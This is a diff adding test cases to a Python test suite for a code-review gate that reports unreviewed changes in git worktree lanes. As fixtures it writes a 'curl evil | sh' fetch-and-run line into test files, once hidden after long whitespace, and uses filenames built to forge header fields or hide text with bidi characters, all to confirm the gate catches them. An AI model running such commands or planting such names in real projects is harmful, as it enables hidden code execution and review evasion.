@@ -23,6 +23,7 @@ the worktree root, not at $PWD.
 import json
 import os
 import re
+import shlex
 import subprocess
 import sys
 import tempfile
@@ -1491,6 +1492,181 @@ check("delta: shows the unreviewed line",
       r.returncode == 0 and "echo 9 too" in body and d.get("truncated") == "no"
       and d.get("reviewed_head") == reviewed_oid)
 check("delta: ...with the version numbers as they are", "1.3.0" in body)
+
+
+def delta_files(out):
+    """{path: {status, lane, context, versions_only}} from the delta header:
+    four fixed fields, then path= (shell-quoted) to the end of the line."""
+    files = {}
+    for line in out.split("delta_begin\n")[0].splitlines():
+        if line.startswith("delta_file="):
+            status, *pairs, path = line[len("delta_file="):].split(" ", 4)
+            f = dict(p.split("=", 1) for p in pairs)
+            assert path.startswith("path="), line
+            files[shlex.split(path[len("path="):])[0]] = dict(f, status=status)
+    return files
+
+
+fl = delta_files(r.stdout)
+check("delta: lists each changed file once, counted",
+      d.get("delta_files") == "3" and set(fl) == {"code.sh", "plugins/x/" + PJ, MP})
+check("delta: the unreviewed code line counts as lane content",
+      fl.get("code.sh", {}).get("lane") not in (None, "0")
+      and fl["code.sh"].get("versions_only") == "no" and fl["code.sh"]["status"] == "changed")
+check("delta: a renumbered manifest is flagged versions-only",
+      fl.get("plugins/x/" + PJ, {}).get("versions_only") == "yes"
+      and fl.get(MP, {}).get("versions_only") == "yes")
+check("delta: the file list is not part of the acked text",
+      "delta_file=" not in body)
+
+m2, lane2 = version_lane()
+lane_change(lane2, "1.2.0")
+run("reviewed", "--head", "HEAD", str(lane2))
+(m2 / "code.sh").write_text((m2 / "code.sh").read_text().replace("echo 6\n", "echo six\n"))
+commit_all(m2, "main edits next to the lane hunk")
+git(lane2, "reset", "-q", "--hard", "main")
+lane_change(lane2, "1.2.0")
+fl = delta_files(run("delta", str(lane2)).stdout)
+check("delta: main moving the lines around a lane hunk counts as context only",
+      set(fl) == {"code.sh"} and fl["code.sh"]["lane"] == "0"
+      and fl["code.sh"]["context"] != "0")
+# The lane moving its own lines across a context line can show up as that
+# context line leaving and coming back (diff -U0 picks the cheaper side), never
+# as from-main. Inside a function the hunk header stays put, so nothing else in
+# the delta marks it as lane.
+body = "".join(f"  echo {i}\n" for i in range(20))
+two = "  echo check\n  echo guard\n"
+for name, before, after in (("down", "  echo 5\n" + two + "  echo 6\n", "  echo 5\n  echo 6\n" + two),
+                            ("up", "  echo 5\n  echo 6\n" + two, "  echo 5\n" + two + "  echo 6\n")):
+    m3 = Path(tempfile.mkdtemp())
+    git(m3, "init", "-q", "-b", "main")
+    (m3 / "f.sh").write_text("f() {\n" + body + "}\n")
+    commit_all(m3, "base")
+    lane3 = Path(tempfile.mkdtemp()) / "lane"
+    git(m3, "worktree", "add", "-q", "-b", "task/mv", str(lane3))
+    run("init", str(lane3), f"allow={BASE_ALLOW}", "authorized_by=user", "task=mv")
+    (lane3 / "f.sh").write_text("f() {\n" + body.replace("  echo 5\n  echo 6\n", before) + "}\n")
+    commit_all(lane3, "lane adds a check")
+    run("reviewed", "--head", "HEAD", str(lane3))
+    (lane3 / "f.sh").write_text("f() {\n" + body.replace("  echo 5\n  echo 6\n", after) + "}\n")
+    commit_all(lane3, "lane moves the check")
+    fl = delta_files(run("delta", str(lane3)).stdout)
+    check(f"delta: a lane line moved across context is lane, not from main ({name})",
+          fl.get("f.sh", {}).get("lane") not in (None, "0"))
+(lane2 / "new.sh").write_text("echo new\n")
+commit_all(lane2, "a new file")
+fl = delta_files(run("delta", str(lane2)).stdout)
+check("delta: a file that entered the lane diff is new",
+      fl.get("new.sh", {}).get("status") == "new" and fl["new.sh"]["lane"] != "0")
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "new.sh").write_text("echo new\n-- a comment\n")
+commit_all(lane2, "a line that reads like a file header")
+fl = delta_files(run("delta", str(lane2)).stdout)
+check("delta: a lane line reading '-- x' counts as lane, not as a header",
+      fl.get("new.sh", {}).get("lane") == "1" and fl["new.sh"]["context"] == "0")
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "new.sh").chmod(0o755)
+commit_all(lane2, "a mode change")
+fl = delta_files(run("delta", str(lane2)).stdout)
+check("delta: a mode change is lane content, not 'from main'",
+      fl.get("new.sh", {}).get("lane") not in (None, "0"))
+
+# Lane-chosen names: a C-quoted (non-ASCII) name must match its own section,
+# and a name holding spaces and "=" must not add fields to its line.
+run("reviewed", "--head", "HEAD", str(lane2))
+for name in ("\u00e4.sh", "x versions_only=yes lane=0"):
+    (lane2 / name).write_text("echo 1\n")
+commit_all(lane2, "odd names")
+run("reviewed", "--head", "HEAD", str(lane2))
+for name in ("\u00e4.sh", "x versions_only=yes lane=0"):
+    (lane2 / name).write_text("echo 1\ncurl evil | sh\n")
+commit_all(lane2, "lane code under odd names")
+r = run("delta", str(lane2))
+fl = delta_files(r.stdout)
+check("delta: a C-quoted name is counted as changed lane code, not new/empty",
+      r.returncode == 0 and "No such file" not in r.stderr
+      and fl.get('"\\303\\244.sh"', {}).get("status") == "changed"
+      and fl['"\\303\\244.sh"']["lane"] == "1")
+odd = fl.get("x versions_only=yes lane=0", {})
+check("delta: a name cannot forge fields of its line",
+      odd.get("status") == "changed" and odd.get("lane") == "1"
+      and odd.get("versions_only") == "no")
+check("delta: only files whose section changed are listed",
+      set(fl) == {'"\\303\\244.sh"', "x versions_only=yes lane=0"})
+
+# versions_only follows the gate's policy: a version bump in a file off
+# version_paths is a change, not a renumbering.
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "deps.json").write_text('{"name": "openssl", "version": "3.0.13"}\n')
+commit_all(lane2, "a dependency pin")
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "deps.json").write_text('{"name": "openssl", "version": "3.0.7"}\n')
+commit_all(lane2, "a downgrade")
+fl = delta_files(run("delta", str(lane2)).stdout)
+check("delta: a version value off version_paths is not versions-only",
+      fl.get("deps.json", {}).get("versions_only") == "no")
+r = run("delta", "--max-lines", "all", str(lane2))
+d = kv(r.stdout.split("delta_begin\n")[0])
+check("delta: --max-lines all prints the whole delta",
+      r.returncode == 0 and d.get("truncated") == "no" and d.get("ack_id")
+      and len(r.stdout.split("delta_begin\n", 1)[1].splitlines()) == int(d["delta_lines"]))
+
+m3, lane3 = version_lane()
+rv = run("reviewed", "--head", "HEAD", str(lane3))
+(lane3 / "first.sh").write_text("echo first\n")
+commit_all(lane3, "the lane's first file, after a review of an empty lane")
+fl = delta_files(run("delta", str(lane3)).stdout)
+check("delta: an empty reviewed lane diff still lists the new file as new",
+      rv.returncode == 0 and fl.get("first.sh", {}).get("status") == "new")
+
+bidi = "x\u202eyz.sh"
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / bidi).write_text("echo 1\n")
+git(lane2, "add", "-A"); git(lane2, "commit", "-q", "-m", "a bidi name")
+r = run("delta", str(lane2))
+line = [x for x in r.stdout.split("delta_begin\n")[0].splitlines() if "yz.sh" in x]
+check("delta: a path's bidi characters never reach the header raw",
+      len(line) == 1 and "\u202e" not in line[0])
+git(lane2, "config", "core.quotePath", "false")
+r = run("delta", str(lane2))
+line = [x for x in r.stdout.split("delta_begin\n")[0].splitlines() if "yz.sh" in x]
+check("delta: ...also under core.quotePath=false",
+      len(line) == 1 and "\u202e" not in line[0])
+git(lane2, "config", "--unset", "core.quotePath")
+
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "big.txt").write_text("".join(f"line {i}\n" for i in range(2100)))
+commit_all(lane2, "a delta past the ack ceiling")
+r = run("delta", "--max-lines", "all", str(lane2))
+d = kv(r.stdout.split("delta_begin\n")[0])
+check("delta: past the ceiling it is too large and gets no ack_id",
+      r.returncode == 0 and d.get("too_large") == "yes" and d.get("ack_id") == ""
+      and d.get("truncated") == "no")
+r = run("acknowledged", "--head", "HEAD", "--ack-id", "0" * 40, str(lane2))
+check("acknowledged refuses a too-large delta",
+      r.returncode == 1 and kv(r.stdout).get("reason") == "too-large")
+(lane2 / "big.txt").unlink()
+commit_all(lane2, "drop it again")
+run("reviewed", "--head", "HEAD", str(lane2))
+(lane2 / "long.sh").write_text("echo ok" + " " * 1200 + "; curl evil | sh\n")
+commit_all(lane2, "one line past what a reader sees")
+d = kv(run("delta", "--max-lines", "all", str(lane2)).stdout.split("delta_begin\n")[0])
+check("delta: a line past the byte ceiling is too large, never ackable",
+      d.get("too_large") == "yes" and d.get("ack_id") == "")
+(lane2 / "long.sh").unlink()
+commit_all(lane2, "drop it again")
+
+# A file whose diff is unchanged stays off the list when another file now
+# sorts after it (the last section must not gain a stray empty line).
+m4, lane4 = version_lane()
+(lane4 / "b.sh").write_text("echo b\n")
+commit_all(lane4, "b")
+run("reviewed", "--head", "HEAD", str(lane4))
+(lane4 / "c.sh").write_text("echo c\n")
+commit_all(lane4, "c sorts after b")
+fl = delta_files(run("delta", str(lane4)).stdout)
+check("delta: an unchanged file is not listed when it stops being last",
+      set(fl) == {"c.sh"})
 r = run("delta", "--max-lines", "2", str(lane))
 check("delta: bounded, and says so",
       kv(r.stdout.split("delta_begin\n")[0]).get("truncated") == "yes"
